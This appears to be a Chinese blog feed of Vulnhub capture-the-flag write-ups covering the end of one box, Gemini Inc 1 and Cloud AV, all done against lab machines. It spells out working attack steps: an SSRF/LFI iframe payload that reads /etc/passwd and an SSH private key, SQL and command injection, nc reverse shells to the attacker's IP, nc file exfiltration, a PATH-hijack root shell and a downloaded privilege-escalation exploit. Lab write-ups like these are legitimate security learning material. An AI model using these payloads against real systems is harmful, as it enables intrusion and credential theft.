class="line">█░░▄▀░░██░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███</span><br><span class="line">█░░▄▀░░██░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░█</span><br><span class="line">█░░▄▀░░██░░░░░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀▄▀░░█</span><br><span class="line">█░░░░░░██████████░░░░░░█░░░░░░██░░░░░░█░░░░░░██░░░░░░░░░░█░░░░░░██░░░░░░█░░░░░░██░░░░░░░░█</span><br><span class="line">██████████████████████████████████████████████████████████████████████████████████████████</span><br><span class="line">                           </span><br><span class="line">                                                                                    </span><br><span class="line">Root Flag: &#123;9440aee508b6215995219c58c8ba4b45&#125;</span><br><span class="line"></span><br><span class="line">!! Congrats you have finished this task !!</span><br><span class="line"></span><br><span class="line">Contact us here:</span><br><span class="line"></span><br><span class="line">Hacking Articles : https://twitter.com/hackinarticles</span><br><span class="line"></span><br><span class="line">Jeenali Kothari  : https://www.linkedin.com/<span class="keyword">in</span>/jeenali-kothari/</span><br><span class="line"></span><br><span class="line">+-+-+-+-+-+ +-+-+-+-+-+-+-+</span><br><span class="line"> |E|n|j|o|y| |H|A|C|K|I|N|G|</span><br><span class="line"> +-+-+-+-+-+ +-+-+-+-+-+-+-+</span><br><span class="line">__________________________________</span><br></pre></td></tr></table></figure></p>
<h4 id="方法2-cve-2021-3493">2.4.2.2. 方法2-(CVE-2021-3493)</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/$ lsb_release -a</span><br><span class="line">lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 18.04 LTS</span><br><span class="line">Release:        18.04</span><br><span class="line">Codename:       bionic</span><br></pre></td></tr></table></figure>
<p>可以看到靶机的操作系统为Ubuntu 18.04
LTS。之前的渗透过程中了解了CVE-2021-3493的漏洞，专门针对Ubuntu进行提取。</p>
<p>因此可以先在kali上编译之后（因为靶机上没有gcc环境）传入到靶机，然后执行即可。这里需要注意的一点是，如果是www-data用户的话，需要到/tmp下面才有读写执行权限，如果是inferno用户，还可以到自己的家目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali: </span><br><span class="line">┌──(root💀kali)-[/home/hdfzzf/CVE-2021-3493]</span><br><span class="line">└─<span class="comment"># python3 -m http.server                                  </span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line"></span><br><span class="line">靶机:</span><br><span class="line">www-data@ubuntu:/tmp$ wget http://10.0.2.4:8000/exp</span><br><span class="line">wget http://10.0.2.4:8000/exp</span><br><span class="line">--2022-05-01 05:25:55--  http://10.0.2.4:8000/exp</span><br><span class="line">Connecting to 10.0.2.4:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 17376 (17K) [application/octet-stream]</span><br><span class="line">Saving to: <span class="string">&#x27;exp&#x27;</span></span><br><span class="line"></span><br><span class="line">exp                 100%[===================&gt;]  16.97K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2022-05-01 05:25:55 (38.2 MB/s) - <span class="string">&#x27;exp&#x27;</span> saved [17376/17376]</span><br><span class="line"></span><br><span class="line">www-data@ubuntu:/tmp$ ls</span><br><span class="line">ls</span><br><span class="line">exp</span><br><span class="line">www-data@ubuntu:/tmp$ chmod +x exp</span><br><span class="line">chmod +x exp</span><br><span class="line">www-data@ubuntu:/tmp$ ./exp</span><br><span class="line">./exp</span><br><span class="line">bash-4.4<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span><br></pre></td></tr></table></figure>
<p>直接提权成功。</p>
<h1 id="总结">3. 总结</h1>
<p>通过对该靶机的渗透，学习到了一下三点：</p>
<ol type="1">
<li>以后记得扫描UDP端口；</li>
<li>定制字典进行暴力破解</li>
<li>第一次遇到MOTD提权，虽然我直接用CVE-2021-3493提权了，但是该靶机上线的时间早于该漏洞</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>定制字典爆破</tag>
        <tag>UDP端口扫描</tag>
        <tag>webdav漏洞</tag>
        <tag>MOTD提权</tag>
        <tag>brainfuck</tag>
      </tags>
  </entry>
  <entry>
    <title>19 Vulnhub Gemini_Inc_1 Writeup</title>
    <url>/2022/05/02/19%20Vulnhub%20Gemini_Inc_1%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度中等，但不论是get
shell还是本地提权，都学习到了新的知识。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/gemini-inc-1,227/">Gemini
Inc: 1 ~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<p>目标：</p>
<ul>
<li>获得root权限</li>
<li>拿到1个flag</li>
</ul>
<p>注释：</p>
<ul>
<li>使用VMWare Workstation</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li>开源代码泄露</li>
<li>XSS漏洞</li>
<li>SSRF漏洞</li>
<li><strong>LFI(location file inclusion)漏洞</strong></li>
<li><strong>服务端组件漏洞</strong></li>
<li>SSH公钥认证</li>
<li><strong>SUID权限漏洞</strong></li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<p>kali: 192.168.100.10 靶机: 192.168.100.21</p>
<p>因为在测试</p>
<h2 id="主机发现端口扫描端口服务发现">2.1.
主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 192.168.100.20</span><br><span class="line">sudo nmap -p22,80 -A 192.168.100.20</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502220323.png" /></p>
<p>信息：</p>
<ol type="1">
<li>22端口的服务为ssh，并且可能存在公钥认证的可能；</li>
<li>80端的服务为http，版本为Apache2.4.25</li>
<li>靶机操作系统为Debian</li>
</ol>
<h2 id="访问http服务">2.2. 访问http服务</h2>
<p>注意：这里需要挂梯子，否则会有资源加载不出来，并且过程非常的慢！这里推荐一篇文章：<a
href="https://www.iculture.cc/cybersecurity/pig=265">Kali
linux如何安装Clash-FancyPig's blog</a></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502220555.png" /></p>
<p>信息：</p>
<ol type="1">
<li>该网站上存在一个内网web应用，可以查看用户的详细信息，以及将信息打印成pdf
-&gt; 这里可能存在SSRF；</li>
<li>该网站基于开源的项目修改搭建的；</li>
<li>存在登录功能点，但是不知道用户名和密码；</li>
</ol>
<p>访问源码，里面有许多文件，其中有一个install.php的文件，根据介绍，搭建该网站需要运行该文件，因此查看</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502220856.png" /></p>
<p>发现存在信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user: admin</span><br><span class="line">password: 1234</span><br></pre></td></tr></table></figure></p>
<p>成功登录admin用户。在登录的界面发现了两个功能点：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502221024.png" /></p>
<p>并且修改profile，可以将内容直接显示到该页面，因此可能存在XSS或者SSTI，SSTI可以排除，因为并没有用到什么模板，因此重点看一下是否存在XSS。经过测试，在display
name这里输入脚本的时候成功执行</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502221225.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502221234.png" /></p>
<p>但是这里的XSS目前还没有什么利用信息。接下来测试第二个功能点，将信息打印成pdf（这里比较慢）查看文档信息，发现：（其实也可以在响应包中查看）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502221511.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502221525.png" /></p>
<h2 id="get-shell">2.3. get shell</h2>
<p>因此搜索wkhtmltopdf exploit，还想该工具存在SSRF漏洞和LFI漏洞</p>
<ul>
<li><a
href="https://www.virtuesecurity.com/kb/wkhtmltopdf-file-inclusion-vulnerability-2/">wkhtmltopdf
File Inclusion Vulnerability - Virtue Security</a></li>
<li><a href="http://hassankhanyusufzai.com/SSRF-to-LFI/">SSRF to Local
File Read - Hassan Khan Security Researcher</a></li>
</ul>
<p>首先，测试本地文件包含： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">display name: &lt;iframe src=&quot;file:///etc/passwd&quot; width=400 height=600&gt;</span><br></pre></td></tr></table></figure></p>
<p>并没有读取到内容。接着尝试远程文件包含：（尝试这一步之后就无法在点击actions了，需要重装虚拟机）
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先在kali的/var/www/html目录下随便创建一个文件，并且输入随机内容</span><br><span class="line">// /var/www/html/1.txt</span><br><span class="line"></span><br><span class="line">然后开启Apache2: systemctl start apache2</span><br><span class="line"></span><br><span class="line">接着：</span><br><span class="line">display name: &lt;iframe src=&quot;http://192.168.100.10/1.txt&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502222416.png" /></p>
<p>可以进行远程文件包含。</p>
<p>最后的利用方式：</p>
<ol type="1">
<li><p>现在kali上编写一个php文件，内容为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">header(<span class="string">&quot;location:file://<span class="subst">$filename</span>&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>kali开启php 服务端</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -S 0.0.0.0:4444</span><br></pre></td></tr></table></figure></li>
<li><p>修改display name</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">display name: &lt;iframe src=&quot;http://192.168.100.10:4444/1.php?file=/etc/passwd&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>导出为pdf之后就能够看到/etc/passwd的内容了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502231024.png" /></p></li>
</ol>
<blockquote>
<p>原理：（个人理解）由于存在远程文件包含，但是不存在本地文件包含，因此可以利用远程主机作为跳板，先访问远程主机的文件1.php，而该文件的内容是从定向到/etc/passwd，因此成功读取了其中的内容。</p>
</blockquote>
<p>接下来想到如果geminni1用户可以ssh公钥认证登陆的话，必定会存在id_rsa,
id_rsa.pub,
authorized_keys。并且路径为/home/gemini1/.ssh。只要我们拿到密钥，也就是id_rsa，即可不用密码登录。</p>
<p>id_rsa.pub和authorized_keys的内容一致，都是公钥，因此可以将三个都读取下来验证一下，想要使用ssh公钥认证登录，就必须将公钥改名为authorized_keys!</p>
<p>将display name修改为如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://192.168.100.10:4444/1.php?file=/home/gemini1/.ssh/id_rsa&quot; width=800 height=1000&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502231445.png" /></p>
<p>然后利用ssh登录 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br><span class="line">ssh gemini1@192.168.100.20 -i id_rsa</span><br><span class="line"></span><br><span class="line">注意：用什么用户创建的id_rsa就用什么用户登录！！看id_rsa的属主</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502232611.png" /></p>
<h2 id="权限提升">2.4. 权限提升</h2>
<p>本题使用的suid提权，首先输入如下命令查看拥有suid权限，并且属主为root的文件：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -user root -perm -u=s -ls 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502232914.png" /></p>
<p>其他文件都是Linux自带的，只有红框这个不是，因此运行此文件看一下内容</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502233009.png" /></p>
<p>还想右边的内容像是调用了Linux自带的命令，尤其最后一行像是date。因此利用strings命令查看一下该文件的内容
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">strings /usr/bin/listinfo</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502233139.png" /></p>
<p>可以分别执行这三条命令，会发现就是执行listinfo后右边显示的内容。注意到前三条都使用了绝对路径，而date没有使用，说明环境变量中可以找到date的目录。这就是我们可以利用的点。</p>
<hr />
<p>我们可以添加gemini1的家目录为环境变量，要放在date目录的前面，因为当执行date的时候，会顺着环境变量中的目录依次查看该目录下是否有可执行文件date，如果有，则执行，没有就查看下一个目录，如果全部目录都便利完都没有则报错。</p>
<p>因此，我们添加的目录必须在原来date目录的前面，然后在gemini1的家目录下创建一个date可执行文件，这样系统就会优先执行我们创建的date。</p>
<hr />
<p>添加环境变量： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/home/gemini1:<span class="variable">$PATH</span> <span class="comment"># 冒号为PATH中的分隔符，这样子表示将/home/gemini1添加在原来PATH的最前面</span></span><br></pre></td></tr></table></figure></p>
<p>在/home/gemini1目录下，编写文件，并编译为可执行文件
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	setuid(<span class="number">0</span>);</span><br><span class="line">	setgid(<span class="number">0</span>);</span><br><span class="line">	system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc date.c -o date</span><br></pre></td></tr></table></figure>
<p>最后，执行/usr/bin/listinfo，成功提权。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502234100.png" /></p>
<p>接下来查看flag： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// /root/flag.txt</span><br><span class="line"></span><br><span class="line">displaying current date...    mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm</span><br><span class="line"></span><br><span class="line">displaying current date...    </span><br><span class="line"></span><br><span class="line">displaying current date...    Congratulations on solving this boot2root machine!</span><br><span class="line"></span><br><span class="line">displaying current date...    Cheers!</span><br><span class="line"></span><br><span class="line">displaying current date...             _.._..,_,_</span><br><span class="line"></span><br><span class="line">displaying current date...            (          )</span><br><span class="line"></span><br><span class="line">displaying current date...             ]~,&quot;-.-~~[</span><br><span class="line"></span><br><span class="line">displaying current date...           .=])&#x27; (;  ([</span><br><span class="line"></span><br><span class="line">displaying current date...           | ]:: &#x27;    [</span><br><span class="line"></span><br><span class="line">displaying current date...           &#x27;=]): .)  ([</span><br><span class="line"></span><br><span class="line">displaying current date...             |:: &#x27;    |</span><br><span class="line"></span><br><span class="line">displaying current date...              ~~----~~</span><br><span class="line"></span><br><span class="line">displaying current date...    https://twitter.com/sec_9emin1</span><br><span class="line"></span><br><span class="line">displaying current date...    https://scriptkidd1e.wordpress.com</span><br><span class="line"></span><br><span class="line">displaying current date...    </span><br><span class="line"></span><br><span class="line">displaying current date...    mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm</span><br></pre></td></tr></table></figure></p>
<p>成为root之后，所有的输出都会带上一行左边的内容，这应该是/usr/bin/listinfo中date那行的内容。</p>
<h1 id="总结">3. 总结</h1>
<p>通过对该靶机的渗透，学到了许多东西：</p>
<ol type="1">
<li>遇到没见过的wen应用，先去搜索是否存在漏洞；</li>
<li>SSRF+LFI+XSS配合使用；</li>
<li>利用SUID提权找的是后来创建的文件，而不是Linux自带的；</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>wkhtmltopdf漏洞</tag>
        <tag>SUID提权</tag>
        <tag>SSH公钥认证</tag>
        <tag>XSS+SSRF+LFI配合</tag>
      </tags>
  </entry>
  <entry>
    <title>2. Vulnhub cloudantivirus writeup</title>
    <url>/2022/03/29/2.%20Vulnhub%20cloudantivirus%20writeup/</url>
    <content><![CDATA[<p>该靶机难度简单。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/</p>
<p>难度：Easy</p>
<p>虚拟机软件：Virtual Box</p>
<h1 id="网卡配置">网卡配置</h1>
<p>查看 <strong>第一周</strong> 的信息。 攻击主机
kali：<code>192.168.137.104</code></p>
<h1 id="渗透">渗透</h1>
<h2 id="主机发现">主机发现</h2>
<p>可以使用 <code>sudo arp-scan -l</code>，也可以使用
<code>arping</code>
。后者速度慢，效率低，但是有一个好处就是后者是一个<strong>网络工具</strong>，而前者是一个<strong>黑客工具</strong>，这就意味着大部分Linux都会装前者，而只有kali这种的才会装后者。因此，在内网渗透的时候目标主机可能没有前者，这时候就能使用后者了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in $(seq 1 254);do sudo arping -c 2 192.168.137.$i;done</span><br></pre></td></tr></table></figure>
<p>与 ping 类似，一次只能扫描一个IP。<code>-c</code>
后面的参数指的是每个IP的发包次数。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329204936.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329204715.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329204836.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329204826.png" /></p>
<p><code>192.168.137.100</code>
是主机在这个网段的IP；<code>192.168.137.1</code>
是网关；<code>192.168.137.104</code> 是kali
IP；那么<code>192.168.137.103</code> 就是目标靶机了。</p>
<p>从扫描结果也可以看出这个工具并不会将本机主机当作存活主机！</p>
<h2 id="端口扫描">端口扫描</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p1-65535 192.168.137.103</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329205256.png" /></p>
<h2 id="端口服务发现">端口服务发现</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,8080 -sV 192.168.137.103</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329205415.png" /></p>
<ol type="1">
<li>22端口上的服务是 openssh</li>
<li>靶机系统为 Ubuntu</li>
<li>8080端口的服务是 http，信息与第1周一样</li>
<li>靶机上存在着 python2 环境</li>
</ol>
<h2 id="访问-http-服务">访问 http 服务</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329211057.png" /></p>
<p>接下来，当然要进行<strong>目录扫描</strong>，结果如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329211439.png" /></p>
<p>有一个 <code>/console</code>，打开如下</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329211506.png" /></p>
<p>这边暂时没有头绪，先放着，去测试一下网页的功能点。</p>
<p>接下来要用 burp
抓包，所以先设置一下代理，将浏览器的代理设置为如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329211629.png" /></p>
<p>端口其实可以设置为其他的，只要和 burp 中的保持一致即可。</p>
<p>发现需要输入验证码，这里可能存在注入点，<strong>先用burp fuzz
一下键盘上的特殊字符</strong>。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329212320.png" /></p>
<p>发现当输入双引号的时候出现了不一样的提示：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329212405.png" /></p>
<p>从这报错信息中可以看到：</p>
<ol type="1">
<li>路径信息</li>
<li>模板为 flask</li>
<li>存在 sql 注入语句，闭合方式为双引号</li>
</ol>
<h2 id="sql-注入">sql 注入</h2>
<p>根据 sql 查询语句构造如下 payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;or 1=1-- </span><br><span class="line">最后面有一个空格！！！</span><br></pre></td></tr></table></figure></p>
<p>成功进入！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329212626.png" /></p>
<p>观察这些文件，发现这跟在命令行执行 <code>ls -l</code>
返回的结果很像。并且这是一个云反病毒的程序，因此我们输入文件名之后，后台肯定执行了某条命令，假设为
<code>cloudav filename</code> 。我们知道 Linux
系统中可以一次性执行多条命令，方式有很多，可以通过 <code>|</code>,
<code>||</code>, <code>&amp;</code>, <code>&amp;&amp;</code>,
<code>;</code> 等符号的帮忙做到，这里选用管道符，输入如下命令：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello|id</span><br></pre></td></tr></table></figure></p>
<p>发现确实可以执行，因此，接下来就可以考虑弹shell了。</p>
<h2 id="反弹-shell">反弹 shell</h2>
<p>第一周中使用的是 python 反弹，这里的环境与第一周一样，也是可以用
python 的。但是由于现在属于学习阶段，因此就使用不同的办法，这里使用
<code>nc</code>。</p>
<p>在kali上启动监听： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure></p>
<p>王爷输入命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello|nc 192.168.137.104 4444 -e /bin/bash</span><br></pre></td></tr></table></figure></p>
<p>这里发现kali并没有。这是因为， <code>-e</code> 这个参数不是所有的
<code>nc</code> 版本都有，可以使用 <code>which nc</code>
查看对方主机是否有 <code>nc</code> ，如果有的话则说明，不存在
<code>-e</code> 操作。这里执行 <code>hello|which nc</code> 弹出信息
<code>/bin/nc</code> 说明对方主机存在 <code>nc</code> 但是没有参数
<code>-e</code>。</p>
<p>此时可以使用 <strong>nc串联</strong>！！！操作如下：</p>
<p>第一步，kali 开两个命令行窗口分别监听： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. nc -lvnp 3333</span><br><span class="line">2. nc -lvnp 4444</span><br></pre></td></tr></table></figure></p>
<p>第二步，网页输入命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello|nc 192.168.137.104 3333|/bin/sh|nc 192.168.137.104 4444</span><br></pre></td></tr></table></figure></p>
<p>解释一下这个意思：</p>
<blockquote>
<p>首先得知道管道符的作用。举个例子，<code>cmd1|cmd2</code>，在这里cmd1执行完之后将结果作为参数传入cmd2（至于cmd2用不用就是得看cmd2本身需不需传参）。现在来解释一下那句命令，假设kali输入命令
<code>ls</code>，然后通过3333端口到达靶机，靶机通过<code>nc 192.168.137.104 3333</code>接收到后将命令通过管道符传给
<code>/bin/sh</code>，shell执行完命令<code>ls</code>后，将结果通过<code>nc 192.168.137.104 4444</code>传入到kali，kali监听4444端口，得到<code>ls</code>执行的结果。</p>
</blockquote>
<p>结果如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329215902.png" /></p>
<p>查看 id 发现是 scanner，不是 root。因此，接下来就需要提权。</p>
<h2 id="权限提升-本地提权">权限提升-本地提权</h2>
<p>第一周用的是<strong>内核漏洞提权</strong>，本周换一个办法。</p>
<p>现在靶机上进行信息收集，看到了
<code>templates</code>，根据之前收集到的信息，这应该是
<code>flask</code> 搭建的模板文件。对我们的提权没有作用，注意到有一个
<code>.sql</code>
文件，这是数据库的文件，查看一下是否有账号和密码这些隐私。</p>
<p>利用 <code>file database.sql</code>
发现打不开，后来发现是因为靶机上没有 <code>sqlite</code>，至于为什么是
sqlite，这是因为 sql
注入的报错信息提示的。那么就将这个文件发到kali上打开。</p>
<p>kali打开监听器： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 5555 &gt; db.sql</span><br></pre></td></tr></table></figure></p>
<p>靶机输入： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 192.168.137.104 5555 &lt; dabase.sql</span><br></pre></td></tr></table></figure></p>
<p>一段时间（保证文件传输完毕）后手动断开连接，接着打开该文件：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. sqlite3</span><br><span class="line">2. .open db.sql</span><br><span class="line">3. .database</span><br><span class="line">4. .dump</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329221819.png" /></p>
<p>此时获得了密码，接下来可以尝试一下获取和 shell
有关的账号，然后与这些密码组合进行爆破攻击。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd|grep /bin/bash</span><br></pre></td></tr></table></figure></p>
<p>发现有三个账号。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329222213.png" /></p>
<p>接下来将用户名保存为一个文件，密码为另一个文件，然后使用
<code>hydra</code> 爆破 ssh。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l user.txt -p passwd.txt ssh://192.168.137.103</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329222931.png" /></p>
<p>发现爆破没有成功的。这件事告诉我们，有时候自认为很有用的密码，并没有什么用。错误没什么可怕的，可怕的是不敢尝试！</p>
<p>一个小秘密，上面搜集的密码可以用来登录之前 sql 注入的地方。</p>
<p>接下来想想还有什么办法可以提权？对了，<strong><code>SUID</code>
提权</strong>也是Linux本地提权常用的一种办法。</p>
<blockquote>
<p>某个程序如果具有 suid
的权限，那么这台主机上的任何用户执行该程序都将默认继承该程序属主的权限。如果属主是root，那么该程序就是用root权限执行的，那么就可以想办法利用该程序去获得shell。</p>
</blockquote>
<p>发现该目录下并没有suid权限的程序，往上一个目录查找，发现！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329223319.png" /></p>
<p>注意中间那个程序最前面有一个 <code>s</code>。这就是 suid
权限的标志！！！然后注意到下面还有一个.c文件，这应该就是源码了，查看源码：
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *freshclam=<span class="string">&quot;/usr/bin/freshclam&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *command = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(freshclam) + <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + <span class="number">2</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(command, <span class="string">&quot;%s %s&quot;</span>, freshclam, argv[<span class="number">1</span>]);</span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">system(command);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>解释一下该源码，从<code>argv[1]</code>看出该程序接收一个参数，并且这个参数和
<code>freshclam</code> 构成一个<code>command</code>，然后
<code>system(command)</code> 执行 命令。因此，我们能够控制的就是
<code>argv[1]</code> 这个参数。</p>
<p>kali再开两个命令行窗口，然后分别执行： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. nc -lvnp 5555</span><br><span class="line">2. nc -lvnp 6666</span><br></pre></td></tr></table></figure></p>
